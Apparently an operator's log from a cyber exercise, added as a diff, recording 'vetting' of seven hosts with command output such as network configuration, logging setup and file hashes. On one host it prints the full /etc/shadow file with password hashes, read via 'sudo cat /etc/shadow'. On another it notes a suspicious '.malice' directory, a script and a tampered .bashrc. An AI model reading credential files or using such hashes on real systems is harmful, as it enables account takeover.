@@ -1,0 +1,1230 @@
+####23-08-22 Notes####
+
+Start: 1300Z
+End: 1900Z
+2022-08-23 17:20:26-- DONE
+>T1: 10.50.29.166
+->T2: 10.20.169.10
+-->T3: 10.20.169.239
+---> T4: 192.186.169.41
+----> T5: 192.186.169.201
+----> T6: 192.186.169.202
+----> T7: 192.186.169.203
+
+
+=========================
+T1: 10.50.29.166
+=========================
+X-----------------------
+
+2022-08-23 13:01:43-- ON
+
+2022-08-23 13:01:45-- start vetting
+
+[engineer4@ext-rtr ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:21:12:c5 brd ff:ff:ff:ff:ff:ff
+    inet 10.20.169.33/24 brd 10.20.169.255 scope global dynamic eth0
+       valid_lft 63748sec preferred_lft 63748sec
+    inet6 fe80::f816:3eff:fe21:12c5/64 scope link 
+       valid_lft forever preferred_lft forever
+
+4 S root      1176     1  0  80   0 - 67041 poll_s Jun18 ?        00:07:22 /usr/sbin/rsyslogd -n
+5 S root       669     1  0  76  -4 - 13880 ep_pol Jun18 ?        00:00:06 /sbin/auditd
+
+[engineer4@ext-rtr ~]$ date; date -u
+Tue Aug 23 13:03:55 UTC 2022
+Tue Aug 23 13:03:55 UTC 2022
+
+cat /etc/rsyslog.conf
+*.* @@10.50.22.142:514
+
+-rw-r--r--. 1 root root                266 Aug 23 13:04 /run/systemd/users/1019
+-rw-r--r--. 1 root root                303 Aug 23 13:04 /run/systemd/sessions/1698
+-rw-rw-r--. 1 root utmp             365184 Aug 23 13:04 /var/log/wtmp
+-rw-r--r--. 1 root root             299300 Aug 23 13:04 /var/log/lastlog
+-rw-rw-r--. 1 root utmp               9600 Aug 23 13:04 /run/utmp
+-rw-------. 1 root root             331242 Aug 23 13:05 /var/log/audit/audit.log
+-rw-------. 1 root root                125 Aug 23 13:05 /var/lib/rsyslog/imjournal.state
+-rw-r-----+ 1 root systemd-journal 8388608 Aug 23 13:05 /run/log/journal/65113b1a0d2f6087d515e6a8cd0ee7ef/system.journal
+
+[engineer4@ext-rtr ~]$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+
+
+2022-08-23 13:07:20-- done vetting
+
+
+2022-08-23 17:20:16-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T2: 10.20.169.10
+=========================
+X-----------------------<F9>
+
+2022-08-23 13:11:12-- ON
+
+2022-08-23 13:11:14-- start vetting
+
+caisson4@CHATSERVER C:\Users\caisson4>ipconfig /all                                                                             
+
+Windows IP Configuration                                                                                                        
+
+   Host Name . . . . . . . . . . . . : CHATSERVER                                                                               
+   Primary Dns Suffix  . . . . . . . :                                                                                          
+   Node Type . . . . . . . . . . . . : Hybrid                                                                                   
+   IP Routing Enabled. . . . . . . . : No                                                                                       
+   WINS Proxy Enabled. . . . . . . . : No                                                                                       
+   DNS Suffix Search List. . . . . . : vta                                                                                      
+
+Ethernet adapter Ethernet:                                                                                                      
+
+   Connection-specific DNS Suffix  . : vta                                                                                      
+   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter                                                          
+   Physical Address. . . . . . . . . : FA-16-3E-27-BF-DF                                                                        
+   DHCP Enabled. . . . . . . . . . . : Yes                                                                                      
+   Autoconfiguration Enabled . . . . : Yes                                                                                      
+   Link-local IPv6 Address . . . . . : fe80::f0c7:b83e:7f79:f11a%6(Preferred)                                                   
+   IPv4 Address. . . . . . . . . . . : 10.20.169.10(Preferred)                                                                  
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0                                                                            
+   Lease Obtained. . . . . . . . . . : Sunday, August 14, 2022 9:26:15 PM                                                       
+   Lease Expires . . . . . . . . . . : Wednesday, August 24, 2022 4:59:17 AM                                                    
+   Default Gateway . . . . . . . . . : 10.20.169.1                                                                              
+   DHCP Server . . . . . . . . . . . : 10.20.169.3                                                                              
+   DHCPv6 IAID . . . . . . . . . . . : 117052990                                                                                
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-E9-F1-8B-FA-16-3E-27-BF-DF                                                
+   DNS Servers . . . . . . . . . . . : 10.50.255.254                                                                            
+   NetBIOS over Tcpip. . . . . . . . : Enabled   
+
+caisson4@CHATSERVER C:\Users\caisson4>date /t                                                                                   
+Tue 08/23/2022                                                                                                                  
+
+caisson4@CHATSERVER C:\Users\caisson4>time /t                                                                                   
+01:12 PM    
+
+caisson4@CHATSERVER C:\Users\caisson4>query user                                                                                
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME                                                     
+ administrator         console             1  Active      none   8/23/2022 12:11 PM      
+
+baretail.exe                  5856 Console                    1      3,264 K Unknown         CHATSERVER\Administrator           
+                     0:00:00 N/A                                                                                                
+baretail.exe                  4356 Console                    1      2,528 K Unknown         CHATSERVER\Administrator   
+
+
+CommandLine="C:\Users\Administrator\Downloads\baretail.exe"  
+
+
+ Directory of c:\                                                                                                               
+
+04/14/2022  03:27 PM           225,280 baretail.exe                                                                             
+04/17/2022  01:13 AM    <DIR>          PerfLogs                                                                                 
+04/17/2022  01:20 AM    <DIR>          Program Files (x86)                                                                      
+04/26/2022  01:38 AM    <DIR>          windows                                                                                  
+05/20/2022  02:32 PM    <DIR>          Program Files                                                                            
+08/14/2022  08:51 PM         5,912,248 lf.exe    
+
+caisson4@CHATSERVER C:\Users\caisson4>certutil -hashfile c:\lf.exe MD5                                                          
+MD5 hash of c:\lf.exe:                                                                                                          
+681e9bc8a22b05e43991d885701eb33e                                                                                                
+CertUtil: -hashfile command completed successfully.    
+
+caisson4@CHATSERVER C:\Users\caisson4>certutil -hashfile c:\Users\Administrator\Downloads\baretail.exe MD5                      
+MD5 hash of c:\Users\Administrator\Downloads\baretail.exe:                                                                      
+f3e7a015c1d541528085d3f9581ab41f                                                                                                
+CertUtil: -hashfile command completed successfully.   
+
+2022-08-23 13:57:26-- done vetting
+
+2022-08-23 17:18:51-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T3: 10.20.169.239
+=========================
+X-----------------------
+
+
+2022-08-23 13:58:52-- ON
+
+2022-08-23 13:58:54-- start vetting
+
+NOC_Admin4@Vyos2:~$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether fa:16:3e:32:1d:b6 brd ff:ff:ff:ff:ff:ff
+    inet 10.20.169.239/24 brd 10.20.169.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe32:1db6/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether fa:16:3e:1d:e8:81 brd ff:ff:ff:ff:ff:ff
+    inet 192.186.169.206/24 brd 192.186.169.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe1d:e881/64 scope link 
+       valid_lft forever preferred_lft forever
+
+5 S root      2005     1  0  80   0 - 29938 ?      Jun18 ?        00:00:10 /usr/sbin/rsyslogd -c4
+
+1 S root      2431     1  0  80   0 - 20949 ?      Jun18 ?        00:00:00 /usr/bin/perl /opt/vyatta/sbin/vyos-intfwatchd
+0 S root      2432  2431  0  80   0 -  1585 ?      Jun18 ?        00:00:00 ip monitor link
+
+NOC_Admin4@Vyos2:~$ date; date -u
+Tue Aug 23 14:00:16 UTC 2022
+Tue Aug 23 14:00:16 UTC 2022
+
+NOC_Admin4@Vyos2:~$ uname -a
+Linux Vyos2 3.13.11-1-amd64-vyos #1 SMP Wed Aug 12 02:08:05 UTC 2015 x86_64 GNU/Linux
+
+2022-08-23 14:12:02-- done vetting
+
+2022-08-23 17:16:45-- OFF
+
+
+------------------------X
+=========================
+
+=========================
+T4: 192.186.169.41
+=========================
+X-----------------------
+
+2022-08-23 14:12:06-- ON
+
+2022-08-23 14:12:11-- start vetting
+
+[askar4@desktop-admin2 ~]$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:d3:b6:f8 brd ff:ff:ff:ff:ff:ff
+    inet 10.101.169.93/8 brd 10.255.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet 10.101.169.93/24 brd 10.101.169.255 scope global dynamic eth0
+       valid_lft 65390sec preferred_lft 65390sec
+    inet6 fe80::f816:3eff:fed3:b6f8/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:7f:c9:bf brd ff:ff:ff:ff:ff:ff
+    inet 192.186.169.41/24 brd 192.186.169.255 scope global dynamic eth1
+       valid_lft 84183sec preferred_lft 84183sec
+    inet6 fe80::f816:3eff:fe7f:c9bf/64 scope link 
+       valid_lft forever preferred_lft forever
+
+[askar4@desktop-admin2 ~]$ sudo ls -latr /root
+total 40
+-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc
+-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc
+-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile
+-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout
+dr-xr-xr-x. 17 root root  224 Aug  8  2019 ..
+-rw-------.  1 root root 6577 Aug  8  2019 original-ks.cfg
+-rw-------.  1 root root 6921 Aug  8  2019 anaconda-ks.cfg
+drwx------.  2 root root   29 May 20 13:00 .ssh
+drwxr-xr-x.  2 root root  191 May 20 13:01 Sup3rS3cr3t
+
+4 S root      1360     1  0  80   0 - 79240 poll_s Jun18 ?        00:06:58 /usr/sbin/rsyslogd -n
+5 S root       564     1  0  76  -4 - 13880 ep_pol Jun18 ?        00:00:05 /sbin/auditd
+
+[askar4@desktop-admin2 ~]$ date; date -u
+Tue Aug 23 14:16:58 UTC 2022
+Tue Aug 23 14:16:58 UTC 2022
+
+-rw-------. 1 root root               29272 Aug 23 14:13 /var/log/messages
+-rw-rw-r--. 1 root utmp              114048 Aug 23 14:13 /var/log/wtmp
+-rw-rw-r--. 1 root utmp                9600 Aug 23 14:13 /run/utmp
+-rw-r--r--. 1 root root              299300 Aug 23 14:13 /var/log/lastlog
+-rw-------. 1 root root               58176 Aug 23 14:18 /var/account/pacct
+-rw-------. 1 root root                 125 Aug 23 14:18 /var/lib/rsyslog/imjournal.state
+-rw-------. 1 root root             1876777 Aug 23 14:18 /var/log/audit/audit.log
+-rw-------. 1 root root             5439165 Aug 23 14:18 /var/log/secure
+-rw-r-----+ 1 root systemd-journal 25165824 Aug 23 14:18 /run/log/journal/65113b1a0d2f6087d515e6a8cd0ee7ef/system.journal
+
+[askar4@desktop-admin2 ~]$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             targeted
+Current mode:                   enforcing
+Mode from config file:          enforcing
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      31
+
+2022-08-23 14:21:45-- done vetting
+
+[askar4@desktop-admin2 ~]$ sudo ls -latr /root/Sup3rS3cr3t
+total 28
+-rw-r--r--. 1 root root 1014 May 20 13:01 S3cr3tSqu1r1.stuff
+-rw-r--r--. 1 root root   17 May 20 13:01 S3cr3tSqu1r12.stuff
+-rw-r--r--. 1 root root 1000 May 20 13:01 S3cr3tSqu1r2.stuff
+-rw-r--r--. 1 root root   12 May 20 13:01 S3cr3tSqu1r13.stuff
+-rw-r--r--. 1 root root 1000 May 20 13:01 S3cr3tSqu1r3.stuff
+-rw-r--r--. 1 root root   20 May 20 13:01 S3cr3tSqu1r14.stuff
+drwxr-xr-x. 2 root root  191 May 20 13:01 .
+-rw-r--r--. 1 root root 1000 May 20 13:01 S3cr3tSqu1r4.stuff
+dr-xr-x---. 4 root root  189 May 20 13:25 ..
+
+
+2022-08-23 17:14:59-- OFF
+------------------------X
+=========================
+
+=========================
+T5: 192.186.169.201
+=========================
+X-----------------------
+
+2022-08-23 14:36:43-- ON
+
+2022-08-23 14:36:46-- start vetting
+
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:7a:9b:d1 brd ff:ff:ff:ff:ff:ff
+    inet 192.186.169.201/24 brd 192.186.169.255 scope global ens3
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe7a:9bd1/64 scope link 
+       valid_lft forever preferred_lft forever
+3: ens4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:2e:c7:9b brd ff:ff:ff:ff:ff:ff
+    inet 129.168.169.201/16 brd 129.168.255.255 scope global ens4
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe2e:c79b/64 scope link 
+       valid_lft forever preferred_lft forever
+
+4 S root      1640  1491  0  80   0 - 17076 -      13:26 tty1     00:00:00 sudo tcpdump -i lo -w /var/log/tcpdump.pcap
+4 S root      1641  1640  0  80   0 -  5700 -      13:26 tty1     00:00:00 tcpdump -i lo -w /var/log/tcpdump.pcap
+
+4 S syslog     984     1  0  80   0 - 66819 -      13:05 ?        00:00:00 /usr/sbin/rsyslogd -n
+
+w
+ 14:40:51 up  1:35,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+radicle  tty1     -                13:08    1:14m  0.89s  0.33s -bash
+
+date; date -u
+Tue Aug 23 14:44:45 UTC 2022
+Tue Aug 23 14:44:45 UTC 2022
+
+-rw-r--r--   1 root      root            1282048 Aug 23 14:45 tcpdump.pcap
+
+rsyslog
+*.* @129.168.169.186:514
+
+2022-08-23 15:12:52-- done vetting
+
+2022-08-23 15:13:05-- user data
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+askar1:x:1001:27::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:27::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:27::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:27::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:27::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:27::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:27::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:27::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:27::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:27::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:27::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:27::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:27::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:27::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:27::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:27::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:27::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:27::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:27::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:27::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:27::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:27::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:27::/home/useraccounts/askar23:/bin/bash
+radicle:x:1024:27::/home/useraccounts/radicle:/bin/bash
+
+sudo cat /etc/shadow
+root:$6$wkTEo8CR$lzQYtKQGSZLOHiHnUVViCol8dO2Um4jg8N0eKu1/L0qg6ZAS01h2NqcrFGHCEKneJ4doHrmVnLoOGYXLOEpET1:19034:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:19034:0:99999:7:::
+askar1:$1$mdv4K.vH$rS0f7jY3QQ.zock.fev/v0:19034:0:99999:7:::
+askar2:$1$6IraLPvB$tfs8b8YRYLnEmZUio4LLk0:19034:0:99999:7:::
+askar3:$1$rFVT76Tq$xd0lbpM0pumgmuq5u1Xf8.:19034:0:99999:7:::
+askar4:$1$sdl7nyyT$VlocoOkfnRviepMWoeYez1:19034:0:99999:7:::
+askar5:$1$xrgl6DwM$kQtI8gvmjiHvh/c8mg.Jk0:19034:0:99999:7:::
+askar6:$1$KdLemPUe$7uDVEy/zwih5DYvXExE6x.:19034:0:99999:7:::
+askar7:$1$d8hhrBNE$Yb/AT9HiZTK0RQ7Bik6HO/:19034:0:99999:7:::
+askar8:$1$oLBLSy3F$CHT6HV8KYzWm/mkd21c5C.:19034:0:99999:7:::
+askar9:$1$2j8b.Zl4$w7T9M4dxqk/x4mWg71rYS/:19034:0:99999:7:::
+askar10:$1$FCZWt7a3$JAHbDwczx.bj8eALvAaYl/:19034:0:99999:7:::
+askar11:$1$nJoeMvXb$7b5yNimTyMYDq50Ki5.x7.:19034:0:99999:7:::
+askar12:$1$nDUwYCvm$bOLFmyfIVSxx3trhdx2Od0:19034:0:99999:7:::
+askar13:$1$KOr7c3Dm$M2hojOM9/QIZIikbIyP8G0:19034:0:99999:7:::
+askar14:$1$blXPiFek$iz16cuCReghtJ4YIzhKjn1:19034:0:99999:7:::
+askar15:$1$Jn4T6lrZ$Hz1/d9Wf6LTQX0QBB0ZJI/:19034:0:99999:7:::
+askar16:$1$IAaffR8H$Rc7YF3.VHnuzh9bwPyPN80:19034:0:99999:7:::
+askar17:$1$.LLp1QZW$kG/6sAtk67tln2BhDGOKB/:19034:0:99999:7:::
+askar18:$1$cSZQSN0Q$bFShyzI5tuBgRuqlO9C.V0:19034:0:99999:7:::
+askar19:$1$Cs7N4twX$9tjHHX0JwAarPgJ6.xzwN.:19034:0:99999:7:::
+askar20:$1$NRDCTTZE$hLKUSrMRbh9gTMFbcenFW.:19034:0:99999:7:::
+askar21:$1$YC7wmjwY$s0Ip9.1RSFQiIQxZ4kBSk/:19034:0:99999:7:::
+askar22:$1$DiH/rw54$0ma7NXvGTTC4Zrk4wn/je1:19034:0:99999:7:::
+askar23:$1$ShVdtpt7$npzJUfZCuX.1thmK3XxJg/:19034:0:99999:7:::
+radicle:$1$sVpjA7FH$lVOR9EyN71RzoIasP0yIB1:19034:0:99999:7:::
+
+sudo cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:ubuntu
+fax:x:21:
+voice:x:22:
+cdrom:x:24:ubuntu
+floppy:x:25:ubuntu
+tape:x:26:
+sudo:x:27:ubuntu
+audio:x:29:ubuntu
+dip:x:30:ubuntu
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:ubuntu
+sasl:x:45:
+plugdev:x:46:ubuntu
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:ubuntu
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+admin:x:113:
+netdev:x:114:ubuntu
+ubuntu:x:1000:
+
+lastlog            
+Username         Port     From             Latest
+root                                       **Never logged in**
+daemon                                     **Never logged in**
+bin                                        **Never logged in**
+sys                                        **Never logged in**
+sync                                       **Never logged in**
+games                                      **Never logged in**
+man                                        **Never logged in**
+lp                                         **Never logged in**
+mail                                       **Never logged in**
+news                                       **Never logged in**
+uucp                                       **Never logged in**
+proxy                                      **Never logged in**
+www-data                                   **Never logged in**
+backup                                     **Never logged in**
+list                                       **Never logged in**
+irc                                        **Never logged in**
+gnats                                      **Never logged in**
+nobody                                     **Never logged in**
+systemd-network                            **Never logged in**
+systemd-resolve                            **Never logged in**
+syslog                                     **Never logged in**
+messagebus                                 **Never logged in**
+_apt                                       **Never logged in**
+lxd                                        **Never logged in**
+uuidd                                      **Never logged in**
+dnsmasq                                    **Never logged in**
+landscape                                  **Never logged in**
+sshd                                       **Never logged in**
+pollinate                                  **Never logged in**
+ubuntu                                     **Never logged in**
+askar1                                     **Never logged in**
+askar2                                     **Never logged in**
+askar3                                     **Never logged in**
+askar4                                     **Never logged in**
+askar5                                     **Never logged in**
+askar6                                     **Never logged in**
+askar7                                     **Never logged in**
+askar8                                     **Never logged in**
+askar9                                     **Never logged in**
+askar10                                    **Never logged in**
+askar11                                    **Never logged in**
+askar12                                    **Never logged in**
+askar13                                    **Never logged in**
+askar14                                    **Never logged in**
+askar15                                    **Never logged in**
+askar16                                    **Never logged in**
+askar17                                    **Never logged in**
+askar18                                    **Never logged in**
+askar19                                    **Never logged in**
+askar20                                    **Never logged in**
+askar21                                    **Never logged in**
+askar22                                    **Never logged in**
+askar23                                    **Never logged in**
+radicle          tty1                      Tue Aug 23 13:08:42 +0000 2022
+
+last
+radicle  tty1                          Tue Aug 23 13:08   still logged in
+reboot   system boot  4.15.0-180-gener Tue Aug 23 13:05   still running
+radicle  tty1                          Tue Aug 23 12:32 - down   (00:29)
+
+wtmp begins Tue Aug 23 12:32:27 2022
+
+
+2022-08-23 15:22:37-- done catalog
+
+2022-08-23 15:27:09-- OFF 
+
+
+------------------------X
+=========================
+
+=========================
+T6: 192.186.169.202
+=========================
+X-----------------------
+
+2022-08-23 15:28:01-- ON
+
+2022-08-23 15:28:02-- start vetting
+
+askar4@DESKTOP-USER22:~$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc mq state UP group default qlen 1000
+    link/ether fa:16:3e:7e:f9:f4 brd ff:ff:ff:ff:ff:ff
+    inet 192.186.169.202/24 brd 192.186.169.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f816:3eff:fe7e:f9f4/64 scope link 
+       valid_lft forever preferred_lft forever
+
+drwxr-xr-x.   2 root root  4096 Aug 23 13:40 .malice
+
+askar4@DESKTOP-USER22:~$ ls -latr /.malice
+-bash: /usr/include/.../brconfig.sh: No such file or directory
+-bash: br_load_config: command not found
+total 20
+-rwxr-xr-x.  1 root root  397 Apr 18 15:17 alias
+drwxr-xr-x. 23 root root 4096 Jun 18 01:01 ..
+-rw-r--r--.  1 root root 3924 Aug 23 13:32 .bashrc_malice
+-rwxrwxrwx.  1 root root  985 Aug 23 13:37 malice.sh
+drwxr-xr-x.  2 root root 4096 Aug 23 13:40 .
+
+askar4@DESKTOP-USER22:~$ ls -latr .
+-bash: /usr/include/.../brconfig.sh: No such file or directory
+-bash: br_load_config: command not found
+total 40
+-rw-r--r--.  1 askar4 sudo   675 May 15  2017 .profile
+-rw-r--r--.  1 askar4 sudo   220 May 15  2017 .bash_logout
+drwxr-xr-x. 26 root   root  4096 Feb 11  2022 ..
+-rw-r--r--.  1 root   root    81 Apr 15 14:28 SecurityNotice.txt
+drwxr-xr-x.  2 askar4 sudo  4096 Apr 15 14:28 .
+-rw-------.  1 askar4 sudo  5587 May 23 16:16 .bash_history
+-rw-r--r--.  1 askar4 sudo 11772 Aug 23 13:41 .bashrc
+
+askar4@DESKTOP-USER22:~$ sudo ls -latr /root
+sudo: unable to resolve host DESKTOP-USER22
+total 92
+-rw-r--r--.  1 root root   148 Aug 17  2015 .profile
+drwx------.  2 root root  4096 Feb 11  2022 .ssh
+-rw-r--r--.  1 root root    55 Apr 14 17:06 .dmrc
+drwx------.  3 root root  4096 Apr 14 17:06 .gnupg
+drwxr-xr-x.  2 root root  4096 Apr 14 17:06 Desktop
+drwxr-xr-x.  3 root root  4096 Apr 14 17:06 .local
+-rw-------.  1 root root  2501 Apr 14 17:06 .xsession-errors.old
+drwxr-xr-x.  2 root root  4096 Apr 14 17:06 .wicd
+drwx------.  5 root root  4096 Apr 14 17:06 .cache
+-rw-r--r--.  1 root root    81 Apr 14 18:57 SecurityNotice.txt
+-rw-------.  1 root root    59 Apr 15 13:50 .Xauthority
+-rw-------.  1 root root  2501 Apr 15 13:50 .xsession-errors
+drwx------.  2 root root  4096 Apr 15 13:51 .gconf
+-rw-r--r--.  1 root root  7842 Apr 15 15:54 .bashrc
+drwx------.  4 root root  4096 Apr 15 17:35 .thumbnails
+drwxr-xr-x. 10 root root  4096 May 20 14:47 .config
+drwxr-xr-x. 23 root root  4096 Jun 18 01:01 ..
+-rw-------.  1 root root   240 Aug 23 13:41 .bash_history
+-rw-------.  1 root root 10991 Aug 23 13:48 .viminfo
+drwx------. 11 root root  4096 Aug 23 13:48 .
+
+4 S root       818     1  0  80   0 - 62516 -      Jun18 ?        00:00:02 /usr/sbin/rsyslogd -n
